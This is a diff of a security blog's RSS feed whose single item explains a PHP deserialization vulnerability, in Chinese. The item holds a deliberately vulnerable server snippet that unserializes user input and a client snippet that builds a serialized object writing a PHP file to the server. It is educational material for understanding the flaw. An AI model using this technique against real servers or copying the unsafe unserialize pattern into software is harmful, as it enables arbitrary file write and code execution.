@@ -8,7 +8,9 @@
     <language>en-us</language>
     <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
     <lastBuildDate>Mon, 25 Jul 2016 23:32:52 +0800</lastBuildDate>
-    <atom:link href="http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml" />
+    
+	<atom:link href="http://wyb0.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>PHP反序列化漏洞</title>
@@ -16,54 +18,12 @@
       <pubDate>Mon, 25 Jul 2016 23:32:52 +0800</pubDate>
       
       <guid>http://wyb0.com/posts/php-deserialization-vulnerabilities/</guid>
-      <description>
-
-&lt;h3 id=&#34;0x00-关于反序列化漏洞:3057159b4bfcb9954edec56a71313f3d&#34;&gt;0x00 关于反序列化漏洞&lt;/h3&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;序列化：使用函数serialize()可将实例序列化为字符串&lt;br /&gt;
-反序列化：使用函数unserialize()可将序列化的字符串还原&lt;br /&gt;
-若服务端有如下代码：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-    class foo{
-        public $file = &amp;quot;test.txt&amp;quot;;
-        public $data = &amp;quot;123456&amp;quot;;
-
-        function __destruct(){
-            file_put_contents($this-&amp;gt;file,$this-&amp;gt;data);
-        }
-    }
-
-    $d = $_REQUEST[&#39;str&#39;];
-    var_dump($d);
-    echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;
-    $tc = unserialize(base64_decode($d));
-    var_dump($tc);
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;客户端可构造如下代码生成序列化后的字符串提交给服务端，&lt;br /&gt;
-服务端就会生成文件xx.php，内容为&lt;b&gt;&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/b&gt;：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-    class foo {
-        public $ﬁle = &amp;quot;test.txt&amp;quot;;
-        public $data = &amp;quot;123456&amp;quot;;
-        
-        function __destruct() {
-            ﬁle_put_contents($this-&amp;gt;ﬁle, $this-&amp;gt;data);
-        }
-    }
-
-    $f = new foo();
-    $f-&amp;gt;ﬁle = &amp;quot;xx.php&amp;quot;;
-    $f-&amp;gt;data = &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;;
-    echo base64_encode(serialize($f));
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/blockquote&gt;
-</description>
+      <description>0x00 关于反序列化漏洞  序列化：使用函数serialize()可将实例序列化为字符串
+反序列化：使用函数unserialize()可将序列化的字符串还原
+若服务端有如下代码：
+&amp;lt;?php class foo{ public $file = &amp;quot;test.txt&amp;quot;; public $data = &amp;quot;123456&amp;quot;; function __destruct(){ file_put_contents($this-&amp;gt;file,$this-&amp;gt;data); } } $d = $_REQUEST[&#39;str&#39;]; var_dump($d); echo &amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $tc = unserialize(base64_decode($d)); var_dump($tc); ?&amp;gt;  客户端可构造如下代码生成序列化后的字符串提交给服务端，
+服务端就会生成文件xx.php，内容为&amp;lt;?php phpinfo(); ?&amp;gt;：
+&amp;lt;?php class foo { public $ﬁle = &amp;quot;test.txt&amp;quot;; public $data = &amp;quot;123456&amp;quot;; function __destruct() { ﬁle_put_contents($this-&amp;gt;ﬁle, $this-&amp;gt;data); } } $f = new foo(); $f-&amp;gt;ﬁle = &amp;quot;xx.php&amp;quot;; $f-&amp;gt;data = &amp;quot;&amp;lt;?php phpinfo(); ?</description>
     </item>
     
   </channel>
